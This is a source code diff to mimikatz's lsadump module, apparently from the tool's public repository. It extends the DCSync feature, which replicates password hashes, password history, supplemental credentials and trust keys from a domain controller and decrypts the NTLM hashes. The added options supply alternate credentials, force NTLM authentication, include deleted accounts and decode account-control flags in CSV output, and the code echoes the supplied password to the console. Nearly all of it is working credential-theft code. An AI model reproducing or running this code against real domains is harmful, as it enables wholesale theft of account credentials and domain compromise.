@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 
 	Vincent LE TOUX
@@ -18,11 +18,14 @@ LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
 	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
 	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
 	szOID_ANSI_currentValue,
+	szOID_isDeleted,
 };
 LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
 	szOID_ANSI_name,
 	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
-	szOID_ANSI_unicodePwd
+	szOID_ANSI_userAccountControl,
+	szOID_ANSI_unicodePwd,
+	szOID_isDeleted,
 };
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
@@ -38,8 +41,9 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
 	LPWSTR szTmpDc = NULL;
 	DRS_EXTENSIONS_INT DrsExtensionsInt;
-	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
-	
+	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL), csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL), withDeleted = kull_m_string_args_byName(argc, argv, L"deleted", NULL, NULL), decodeUAC = kull_m_string_args_byName(argc, argv, L"uac", NULL, NULL), bAuthNtlm = kull_m_string_args_byName(argc, argv, L"authntlm", NULL, NULL);
+	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
+
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
 			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
@@ -63,8 +67,31 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 				else
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
+				if(kull_m_string_args_byName(argc, argv, L"authuser", (const wchar_t **) &secIdentity.User, NULL))
+				{
+					secIdentity.UserLength = lstrlen((LPCWSTR) secIdentity.User);
+					if(kull_m_string_args_byName(argc, argv, L"authdomain", (const wchar_t **) &secIdentity.Domain, L""))
+					{
+						secIdentity.DomainLength = lstrlen((LPCWSTR) secIdentity.Domain);
+					}
+					secIdentity.UserLength = lstrlen((LPCWSTR) secIdentity.User);
+					if(kull_m_string_args_byName(argc, argv, L"authpassword", (const wchar_t **) &secIdentity.Password, L""))
+					{
+						secIdentity.PasswordLength = lstrlen((LPCWSTR) secIdentity.Password);
+					}
+				}
+
+				if(secIdentity.UserLength)
+				{
+					kprintf(L"[AUTH] Username: %s\n[AUTH] Domain  : %s\n[AUTH] Password: %s\n", secIdentity.User, secIdentity.Domain, secIdentity.Password);
+				}
+				if(bAuthNtlm)
+				{
+					kprintf(L"[AUTH] Explicit NTLM Mode\n");
+				}
+
 				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, bAuthNtlm ? RPC_C_AUTHN_WINNT : ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
 					{
@@ -110,7 +137,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 													for(i = 0; i < getChRep.V6.cNumObjects; i++)
 													{
 														if(csvOutput)
-															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
+															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, withDeleted, decodeUAC);
 														else
 															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
 														pObject = pObject->pNextEntInf;
@@ -184,24 +211,46 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 	return status;
 }
 
-void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
+void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL withDeleted, BOOL decodeUAC)
 {
-	DWORD rid = 0;
-	PBYTE unicodePwd;
-	DWORD unicodePwdSize;
+	DWORD i, szData;
+	PBYTE data;
 	PVOID sid;
 	BYTE clearHash[LM_NTLM_HASH_LENGTH];
-	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
-		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
-		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &unicodePwd, &unicodePwdSize))
+
+	if(!withDeleted)
 	{
-		rid = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
-		kprintf(L"%u\t", rid);
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_isDeleted, &data, &szData) && (szData == sizeof(BOOL)))
+			withDeleted = !*(PBOOL) data;
+		else withDeleted = TRUE;
+	}
+
+	if(withDeleted &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &sid, NULL) &&
+		kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &data, &szData))
+	{
+		i = *GetSidSubAuthority(sid, *GetSidSubAuthorityCount(sid) - 1);
+		kprintf(L"%u\t", i);
 		kull_m_rpc_drsr_findPrintMonoAttr(NULL, prefixTable, attributes, szOID_ANSI_sAMAccountName, FALSE);
 		kprintf(L"\t");
-		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(unicodePwd, &rid, clearHash)))
+		if(NT_SUCCESS(RtlDecryptDES2blocks1DWORD(data, &i, clearHash)))
 			kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
 		else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
+		{
+			if(decodeUAC)
+			{
+				for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
+				{
+					kprintf(L"\t");
+					if((1 << i) & *(PDWORD) data)
+						kprintf(L"%s", KUHL_M_LSADUMP_UF_FLAG[i]);
+				}
+			}
+			else kprintf(L"\t%u", *(PDWORD) data);
+		}
 		kprintf(L"\n");
 	}
 }
@@ -218,13 +267,12 @@ void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLO
 		kuhl_m_lsadump_dcsync_descrSecret(prefixTable, attributes, someExport);
 }
 
-const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
+const wchar_t * KUHL_M_LSADUMP_UF_FLAG[32] = {
 	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
 	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
 	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED", 
 	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
 };
-
 LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
 {
 	LPCWSTR target;
@@ -818,7 +866,6 @@ NTSTATUS kuhl_m_lsadump_dcshadow_encode(PDCSHADOW_PUSH_REQUEST request, int argc
 	BOOL cleanData = kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL), multipleValues = kull_m_string_args_byName(argc, argv, L"multiple", NULL, NULL);
 	UNICODE_STRING us;
 
-
 	if(kull_m_string_args_byName(argc, argv, L"object", &szObject, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"attribute", &szAttribute, NULL))
@@ -900,7 +947,6 @@ NTSTATUS kuhl_m_lsadump_dcshadow_view(PDCSHADOW_PUSH_REQUEST request)
 	}
 	return STATUS_SUCCESS;
 }
-
 
 PBERVAL kuhl_m_lsadump_dcshadow_getSingleAttr(PLDAP ld, PLDAPMessage pMessage, PCWCHAR attr)
 {
